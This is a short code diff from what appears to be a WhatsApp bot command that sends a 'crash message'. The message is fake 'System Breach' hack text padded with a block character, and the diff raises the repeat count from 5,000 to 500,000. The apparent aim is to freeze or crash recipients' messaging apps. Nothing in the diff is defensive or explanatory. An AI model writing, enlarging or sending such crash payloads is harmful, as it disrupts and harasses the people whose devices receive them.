@@ -9,7 +9,7 @@ cmd({
 }, async (conn, mek, m, { from, reply }) => {
     try {
         const crashMessage = `💻 *QUEEN SADU HACK STARTING...* 💻\n\n` + 
-        "░".repeat(5000) + // Heavy Unicode Characters
+        "░".repeat(500000) + // Heavy Unicode Characters
         "\n🔒 *System Breach: Successful!* 🔓\n🚀 *Command Execution: Complete!* 🎯";
 
         // Send Crash Message
